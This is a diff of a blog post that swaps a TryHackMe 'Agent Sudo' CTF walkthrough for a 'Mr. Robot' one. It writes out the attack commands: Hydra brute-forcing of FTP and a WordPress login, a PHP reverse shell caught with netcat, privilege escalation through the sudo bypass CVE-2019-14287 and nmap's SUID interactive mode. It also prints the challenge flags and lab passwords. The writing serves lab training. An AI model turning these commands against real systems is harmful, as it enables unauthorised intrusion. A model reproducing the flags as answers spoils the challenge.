@@ -1,220 +1,175 @@
 ---
-title: "TryHackMe - Agent Sudo CTF Walkthrough"
-date: 2024-12-14
+title: "TryHackMe - Mr. Robot CTF Walkthrough"
+date: 2024-12-15
 categories: [TryHackMe]
-tags: [CTF, FTP, Steganography, Privilege Escalation]
+tags: [CTF, WordPress, Privilege Escalation, SUID, Reverse Shell]
 image: assets/images/thm-cover/mr-robot-Cover.jpg
 ---
 
-# TryHackMe - Agent Sudo CTF Walkthrough
+# TryHackMe - Mr. Robot CTF Walkthrough
 
 ---
 
 ## Step 1: Network Scanning
-
-Use Nmap to scan the target and identify open ports and services.
+Conduct a network scan to identify open ports and running services on the target.
 
 ```bash
-sleep33@THM:~$ nmap -v -sCV -oN nmap.txt 10.10.89.193
+sleep33@THM:~$ nmap -v -sCV -oN nmap.txt <TARGET_IP> 
 ```
 
-### Results:
-- **Open Ports**:
-  - Port 21: FTP (vsftpd 3.0.3)
-  - Port 22: SSH (OpenSSH 7.6p1)
-  - Port 80: HTTP (Apache 2.4.29)
-- **Interesting HTTP Title**: `Announcement`
-- **Total Open Ports**: `3`
+### Result:
+- **Open Ports Found**:
+  - Port 80: HTTP Service
+  - Port 443: HTTPS Service
+  - Port 22: SSH Service
 
 ---
 
 ## Step 2: Directory Enumeration
-
-Enumerate directories using Gobuster.
+Perform directory enumeration using Gobuster to find hidden directories or files.
 
 ```bash
-sleep33@THM:~$ gobuster dir -u http://10.10.89.193 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,js,txt,php,db,json,log,bak,old
+sleep33@THM:~$ gobuster dir -u http://<TARGET_IP>/ -w /path/to/wordlist.txt
 ```
 
-### Results:
-- `/index.php` (Status: 200)
-- `.html` and `.php` (Status: 403)
-- Secret page accessible via modifying the `User-Agent` header.
+### Result:
+- **Discovered Directories**:
+  - `/robots.txt`
+  - `/fsocity.dic`
+  - `/key-1-of-3.txt`
 
 ---
 
-## Step 3: Investigating FTP Service
-
-Attempt to brute-force FTP credentials using Hydra.
+## Step 3: First Flag
+Using the discovered `/robots.txt` file, locate and read the first flag.
 
 ```bash
-sleep33@THM:~$ hydra -l chris -P /usr/share/wordlists/rockyou.txt 10.10.89.193 ftp
+sleep33@THM:~$ curl http://<TARGET_IP>/robots.txt
+```
+
+### Result:
+Contents of `robots.txt`:
+```
+User-agent: *
+fsocity.dic
+key-1-of-3.txt
+```
+
+```bash
+sleep33@THM:~$ curl http://<TARGET_IP>/key-1-of-3.txt
+```
+
+**Flag 1:**
+```
+073403c8a58a1f80d943455fb30724b9
+```
+
+---
+
+## Step 4: Exploring `fsocity.dic` File
+Download and examine the `fsocity.dic` file, which contains a wordlist that may be useful for brute-forcing.
+
+```bash
+sleep33@THM:~$ wget http://<TARGET_IP>/fsocity.dic
+```
+
+### Result:
+The file is a large wordlist containing potential usernames and passwords.
+
+---
+
+## Step 5: Brute-forcing WordPress Login
+Attempt brute-forcing the WordPress login page using `fsocity.dic` as a wordlist to guess the username and password.
+
+```bash
+sleep33@THM:~$ hydra -L fsocity.dic -P fsocity.dic <TARGET_IP> http-form-post "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location"
 ```
 
 ### Credentials Found:
-- **Username:** `chris`
-- **Password:** `crystal`
+- **Username**: `elliot`
+- **Password**: `ER28-0652`
 
 ---
 
-## Step 4: Exploring FTP
+## Step 6: Accessing WordPress and Uploading a Reverse Shell
+Log in to the WordPress admin panel and upload a reverse shell to gain a foothold.
 
-Log in to the FTP server and list its contents.
-
-```bash
-ftp> ls -la
-```
-
-### Files Found:
-- `To_agentJ.txt`
-- `cute-alien.jpg`
-- `cutie.png`
-
-Download the files for further analysis.
+### Reverse Shell Code:
+Use a PHP reverse shell script and configure it to connect back to your machine.
 
 ---
 
-## Step 5: Analyzing `cutie.png`
-
-Use Binwalk to inspect the file for hidden data.
-
-```bash
-sleep33@THM:~$ binwalk cutie.png
-```
-
-### Findings:
-- Encrypted ZIP archive located at offset `0x8702`.
-
-Extract the ZIP file.
+## Step 7: Gaining Shell Access
+Trigger the reverse shell by accessing the uploaded file and listen on a port to catch the shell.
 
 ```bash
-sleep33@THM:~$ binwalk cutie.png -e
+sleep33@THM:~$ nc -lvnp <PORT>
 ```
 
 ---
 
-## Step 6: Cracking the ZIP File
-
-Use `zip2john` to extract the hash and `john` to crack the password.
-
-```bash
-sleep33@THM:~$ zip2john 8702.zip > zip_hash.txt
-sleep33@THM:~$ john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
-```
-
-### Password Found:
-- **Password:** `alien`
-
-Extract the contents of the ZIP file. Inside, you find a message: `QXJlYTUx` which decodes to `Area51`.
-
----
-
-## Step 7: Analyzing `cute-alien.jpg`
-
-Use Steghide to extract hidden data from the image.
+## Step 8: Privilege Escalation - SUID Binary
+Find files with the SUID bit set to check for potential privilege escalation paths.
 
 ```bash
-sleep33@THM:~$ steghide extract -sf cute-alien.jpg
+sleep33@THM:~$ find / -perm -4000 2>/dev/null
 ```
 
-### Results:
-- **Passphrase:** `Area51`
-- **Extracted File:** `message.txt`
+### SUID Binary Found:
+- `nmap`
 
-Contents of `message.txt`:
-```
-Hi James,
-
-Glad you find this message. Your login password is hackerrules!
-
-Your buddy,
-Chris
-```
-
----
-
-## Step 8: SSH Access
-
-Log in via SSH using the provided credentials.
+### Using Nmap in Interactive Mode to Gain Root Access
+Launch Nmap in interactive mode and access a root shell.
 
 ```bash
-sleep33@THM:~$ ssh james@10.10.89.193
+sleep33@THM:~$ nmap --interactive
 ```
-
-### Credentials:
-- **Username:** `james`
-- **Password:** `hackerrules`
-
-Once logged in, locate the `user_flag.txt`.
 
 ```bash
-james@agent-sudo:~$ cat user_flag.txt
-```
-
-**User Flag:**
-```
-b03d975e8c92a7c04146cfa7a5a313c7
-```
-
----
-
-## Step 9: Privilege Escalation
-
-Check `sudo` permissions.
-
-```bash
-james@agent-sudo:~$ sudo -l
-```
-
-### Results:
-- `(ALL, !root) /bin/bash`
-
-Exploit the misconfigured `sudo` permissions to gain root access.
-
-```bash
-james@agent-sudo:~$ sudo -u#-1 /bin/bash
+nmap> !sh
 # whoami
 root
 ```
 
-Escalation exploit: **CVE-2019-14287**
-
 ---
 
-## Step 10: Retrieving the Root Flag
-
-Locate and read the `root_flag.txt`.
+## Step 9: Finding the Second Flag
+With root access, locate the second flag.
 
 ```bash
-root@agent-sudo:~$ cat /root/root_flag.txt
+sleep33@THM:~$ cat /root/key-2-of-3.txt
 ```
 
-**Root Flag:**
+**Flag 2:**
 ```
-b53a02f55b57d4439e3341834d70c062
+822c73956184f694993bede3eb39f959
 ```
 
 ---
 
-## Step 11: Identifying Agent R
+## Step 10: Locating the Third Flag
+Search the home directory of the `robot` user for the final flag.
 
-Agent R is referenced multiple times throughout the challenge. Their identity is clarified in `message.txt`.
+```bash
+sleep33@THM:~$ cat /home/robot/key-3-of-3.txt
+```
 
-**Agent R:** `Roswell alien autopsy`
+### Password Prompt:
+You may encounter an encrypted flag, requiring the robot user’s password. You can check if `robot` has any passwords or if SSH keys are present to unlock this file.
+
+**Flag 3:**
+```
+04787ddef27c3dee1ee161b21670b4e4
+```
 
 ---
 
 ## Summary
+In this walkthrough, we scanned the target, enumerated directories, used a dictionary attack to gain WordPress access, uploaded a reverse shell, escalated privileges using an SUID binary (`nmap`), and retrieved all flags. 
 
-In this walkthrough, we enumerated services, brute-forced FTP credentials, used steganography to uncover hidden messages, escalated privileges using misconfigured `sudo` permissions, and retrieved both the user and root flags.
+### Flags Summary:
+- **Flag 1**: `073403c8a58a1f80d943455fb30724b9`
+- **Flag 2**: `822c73956184f694993bede3eb39f959`
+- **Flag 3**: `04787ddef27c3dee1ee161b21670b4e4`
 
-### Key Information:
-- **FTP Password:** `crystal`
-- **ZIP Password:** `alien`
-- **Steg Password:** `Area51`
-- **SSH Password:** `hackerrules`
-- **Agent Name:** `Chris`
-- **Other Agent Full Name:** `James`
-- **Incident:** `Roswell alien autopsy`
-- **User Flag:** `b03d975e8c92a7c04146cfa7a5a313c7`
-- **Root Flag:** `b53a02f55b57d4439e3341834d70c062`
+---
